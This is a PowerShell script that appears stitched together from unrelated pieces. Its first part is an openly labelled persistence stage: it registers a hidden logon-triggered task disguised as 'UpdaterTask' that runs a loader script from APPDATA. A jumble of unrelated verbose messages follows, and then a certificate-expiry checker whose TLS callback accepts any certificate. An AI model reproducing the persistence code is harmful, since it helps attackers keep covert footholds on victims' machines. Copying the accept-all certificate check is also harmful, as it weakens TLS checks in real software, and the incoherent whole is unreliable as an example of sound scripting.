
<#
.SYNOPSIS
    Scheduled-task persistence workflow.

.DESCRIPTION
    Builds a hidden PowerShell action, registers it against a logon
    trigger with conservative settings, then verifies the task and
    records its state in a small report.

.NOTES
    The task runs in the current user context.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$TaskName = 'UpdaterTask',
    [string]$ScriptPath = "$env:APPDATA\loader.ps1",
    [string]$LogPath = "$env:TEMP\stage.log",
    [int]$StartDelayMinutes = 29
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Action builder
function New-StageTaskAction {
    [CmdletBinding()]
    param(
        [string]$TargetScript = ''
    )

    Write-Verbose ("Building action for " + $TargetScript)
    $Argument = "-NoP -File `"" + $TargetScript + "`""
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Argument
    return $Action
}

# Registration
function Register-StagePersistence {
    [CmdletBinding()]
    param(
        [string]$TaskName = '',
        [string]$ScriptPath = ""
    )

    $Action = New-StageTaskAction -TargetScript $ScriptPath
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force -ErrorAction SilentlyContinue
    return (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
}

try {
    Write-StageLog -Message "Starting scheduled-task stage"
    $TaskObject = Register-StagePersistence -TaskName $TaskName -ScriptPath $ScriptPath
    Write-StageLog -Message ("Task state: " + $TaskObject.State)
}
catch {
    Write-Warning "Scheduled-task workflow failed: $($_.Exception.Message)"
}

$TaskReport = [ordered]@{
    Stage = "scheduled-task"
    TaskName = $TaskName
    ScriptPath = $ScriptPath
    DelayMinutes = $StartDelayMinutes
}
$TaskReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Stage handoff finished"
Write-Verbose "Operation completed"
Write-Verbose "Collecting host metadata"
Write-Verbose "Inspecting process list"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Starting workflow"
Write-Verbose "Retry budget remaining"
Write-Verbose "Applying operation timeout"
Write-Verbose "Writing diagnostic marker"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$ErrorActionPreference = "Stop"
$WarningDays = 30
$Hosts = @('portal.contoso.com', 'api.contoso.com', 'vpn.contoso.com')
$Port = 8443
$ReportPath = 'C:\Reports\cert-expiry-2024-11-10.csv'

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$DebugPreference = 'SilentlyContinue'

function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}

$remote | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8

$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })
Write-Host ("{0} of {1} certificates are inside the warning window" -f $expiring.Count, @($remote).Count) -ForegroundColor Cyan
